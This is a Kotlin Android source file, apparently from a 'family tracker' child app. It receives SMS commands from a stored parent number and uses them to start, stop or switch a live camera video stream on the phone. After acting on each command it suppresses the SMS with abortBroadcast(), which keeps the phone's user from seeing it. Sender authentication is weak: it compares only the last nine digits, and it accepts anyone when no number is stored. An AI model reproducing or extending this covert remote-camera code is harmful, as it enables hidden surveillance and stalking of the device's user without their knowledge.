package com.family.tracker.child

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log

class CommandReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "CMD"
    }

    override fun onReceive(context: Context, intent: Intent) {
        try {
            val pdus = intent.extras?.get("pdus") as? Array<*> ?: return
            for (pdu in pdus) {
                val msg = SmsMessage.createFromPdu(pdu as ByteArray)
                val text = msg.messageBody?.trim() ?: continue
                val sender = msg.originatingAddress ?: continue

                val prefs = context.getSharedPreferences("tracker", Context.MODE_PRIVATE)
                val parentNum = prefs.getString("parent", "")?.replace(" ", "") ?: ""
                val senderClean = sender.replace(" ", "")
                
                if (parentNum.isNotEmpty() && !senderClean.endsWith(parentNum.takeLast(9))) {
                    Log.d(TAG, "❌ Numéro non autorisé")
                    return
                }

                when (text) {
                    "STREAM_ON" -> {
                        Log.d(TAG, "🎥 DÉMARRAGE FLUX VIDÉO")
                        val i = Intent(context, MJPEGServer::class.java)
                        i.action = MJPEGServer.ACTION_START
                        context.startForegroundService(i)
                        abortBroadcast()
                    }
                    "STREAM_OFF" -> {
                        Log.d(TAG, "🛑 ARRÊT FLUX")
                        val i = Intent(context, MJPEGServer::class.java)
                        i.action = MJPEGServer.ACTION_STOP
                        context.startForegroundService(i)
                        abortBroadcast()
                    }
                    "STREAM_SWITCH" -> {
                        Log.d(TAG, "🔄 CHANGER DE CAMÉRA")
                        val i = Intent(context, MJPEGServer::class.java)
                        i.action = MJPEGServer.ACTION_SWITCH
                        context.startForegroundService(i)
                        abortBroadcast()
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erreur: ${e.message}")
        }
    }
}
